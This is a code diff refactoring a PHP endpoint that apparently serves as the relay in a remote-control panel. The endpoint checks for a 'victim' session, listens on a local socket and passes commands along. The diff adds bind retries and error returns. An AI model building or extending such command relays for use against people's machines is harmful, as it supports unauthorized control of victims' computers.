@@ -1,28 +1,22 @@
 <?php
-
+	include('../modules/utils.php');
 	include('../modules/sessionManager.php');
 	include('../modules/databaseManager.php');
 
-    function main(){
-        # Connect to database
-        $databaseManager = new DatabaseManager();
-        $conn = $databaseManager->connectToDatabase();
-
-		# Start session control
-        $sessionManager = new SessionManager($conn);
-        $sessionManager->startSessionControl();
-
+	/*
+	Function that carries the main feature in the script.
+	Return true if the feature executed on success. Else return false.
+	*/
+	function run($databaseManager, $conn, $sessionManager){
 		# Check if the session is already stored
 		if($sessionManager->isCurrentSessionStored("victim")){
 			if($_SERVER["REQUEST_METHOD"] == "GET"){
-
-				#echo "Comecou os sockets\n";
 
                 # Connection parameters
                 $address = "127.0.0.1";
                 $port = 10000;
                 # Don't timeout
-                set_time_limit(0);
+                #set_time_limit(30);
 
                 /*
                 Create socket with:
@@ -36,14 +30,41 @@
                     echo "socket_create() failed: reason: " . socket_strerror(socket_last_error()) . "\n";
                     # 500 Internal Server Error
                     http_response_code(500);
+					return false;
                 }
 
+				# Try to bind to port multiple times
+				$result = socket_bind_loop($sock, $address, $port,
+					SOCKET_BIND_INTERVAL,SOCKET_BIND_MAX_ATTEMPT_NUMBER, DEBUG);
+
+                if ($result === false) {
+                    echo "socket_bind() failed.\nReason: ($result) " . socket_strerror(socket_last_error($sock)) . "\n";
+                    # 500 Internal Server Error
+                    http_response_code(500);
+					return false;
+                }
+
+				/*
+				$result = false;
+				while(!$result){
+					usleep(SOCKET_BIND_INTERVAL);
+					# Disable warnings
+					#error_reporting(E_ALL ^ E_WARNING);
+					# Try to connect to victim
+                	$result = socket_bind($sock, $address, $port);
+					# Enable warnings
+					#error_reporting(E_ALL);
+				}
+				*/
+				/*
                 # Assign address and port to socket
                 if(socket_bind($sock, $address, $port) === false){
                     echo "socket_bind() failed: reason: " . socket_strerror(socket_last_error($sock)) . "\n";
                     # 500 Internal Server Error
                     http_response_code(500);
+					return 1;
                 }
+				*/
 
                 /*
                 Start listening on port with backlog of 50. It means that it
@@ -54,6 +75,8 @@
                     echo "socket_listen() failed: reason: " . socket_strerror(socket_last_error($sock)) . "\n";
                     # 500 Internal Server Error
                     http_response_code(500);
+					socket_close($sock);
+					return false;
                 }
 
                 # Accept socket connection
@@ -61,6 +84,8 @@
                     echo "socket_accept() failed: reason: " . socket_strerror(socket_last_error($sock)) . "\n";
                     # 500 Internal Server Error
                     http_response_code(500);
+					socket_close($sock);
+					return false;
                 }
 
                 # Read command
@@ -75,19 +100,29 @@
                 # Close connections
                 socket_close($msgsock);
                 socket_close($sock);
-				#echo "Terminou os sockets\n";
-
-                # Wait for commands
-                #sleep(2);
-                #echo "eae rapaziada";
-
             }
 
         }else{
             echo "Your user is not logged. First login, then enter this page.";
             // 401 Unauthorized
             http_response_code(401);
+			return false;
         }
+
+		return true;
+	}
+
+    function main(){
+        # Connect to database
+        $databaseManager = new DatabaseManager();
+        $conn = $databaseManager->connectToDatabase();
+
+		# Start session control
+        $sessionManager = new SessionManager($conn);
+        $sessionManager->startSessionControl();
+
+		# Function that carries the main feature in the script
+		run($databaseManager, $conn, $sessionManager);
 
         # Disconnect from database
         $databaseManager->disconnectFromDatabase();
